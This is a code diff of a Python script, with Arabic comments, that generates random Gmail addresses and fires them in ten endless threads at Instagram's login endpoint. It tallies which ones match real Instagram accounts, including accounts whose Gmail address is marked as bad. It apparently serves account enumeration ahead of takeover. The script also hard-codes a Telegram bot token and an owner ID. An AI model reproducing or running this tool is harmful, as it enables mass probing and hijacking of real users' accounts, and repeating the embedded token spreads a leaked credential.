@@ -5,24 +5,27 @@ from user_agent import generate_user_agent
 import random
 import telebot
 import threading
-import os
 import pyfiglet
-from colorama import Fore, Style, init
+from colorama import Fore, init
 
 init(autoreset=True)
 
+# إعداد البوت
 tok = "7442113281:AAF7i4zBUBvm7_yHwBHZm9QmPZ3T6U8t_6I"
 bot = telebot.TeleBot(tok)
-user_id = "5583353259"  
-os.system("clear")
+user_id = "5583353259"  # معرف المالك
+
+# إعداد الطباعة
 ascii_banner = pyfiglet.figlet_format("S1")
 print(Fore.CYAN + ascii_banner)
 
+# الإحصائيات
 gg = 0
 bb = 0
 gi = 0
 bag = 0
 
+# الدالة الأساسية لمحاولات تسجيل الدخول
 def s1():
     global gg, bb, gi, bag
     email = "".join(random.choice("qwertyuiopasdfghjklzxcvbnm1234567890") for i in range(9)) + "@gmail.com"
@@ -60,6 +63,7 @@ def s1():
         'trustedDeviceRecords': '{}',
         'username': email,
     }
+
     response = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', cookies=cookies, headers=headers, data=data)
     try:
         response_json = response.json()
@@ -96,30 +100,34 @@ def s1():
     except json.JSONDecodeError:
         print(Fore.RED + "Error decoding the response as JSON")
 
-    # تحديث القيم في السطر الحالي فقط
-    print(f"\r{Fore.GREEN}GOOD INSTA AND BAD GMAIL ~ {bag} {Fore.BLUE}GOOD ~ {gg} {Fore.RED}BAD ~ {bb}", end="")
-    
+    # طباعة الإحصائيات بدون مسح الشاشة
+    print(f"""
+    {Fore.GREEN}GOOD INSTA AND BAD GMAIL ~ {bag}
+    {Fore.BLUE}GOOD ~ {gg}
+    {Fore.RED}BAD ~ {bb}
+    """)
+
     time.sleep(random.uniform(1, 3))
 
+# تشغيل المحاولات في عدة خيوط
 def run_threads():
     threads = []
-    for i in range(10):  # تحديد عدد معقول من الخيوط
+    for _ in range(10):  # عدد الخيوط
         t = threading.Thread(target=s1)
         threads.append(t)
         t.start()
     for t in threads:
         t.join()
 
-# تشغيل البوت في خيط منفصل
+# بدء تشغيل البوت
 def start_bot():
     bot.polling(non_stop=True)
 
 if __name__ == "__main__":
-    # تشغيل البوت في خيط
     bot_thread = threading.Thread(target=start_bot)
     bot_thread.start()
-    
-    # الاستمرار في تشغيل الأكواد الأخرى
+
+    # تشغيل المحاولات بشكل مستمر
     while True:
         run_threads()
-        time.sleep(1)  # إضافة تأخير لتحديث الشاشة بشكل متدرج
+        time.sleep(1)  # تأخير بسيط بين الدورات لتقليل الحمل
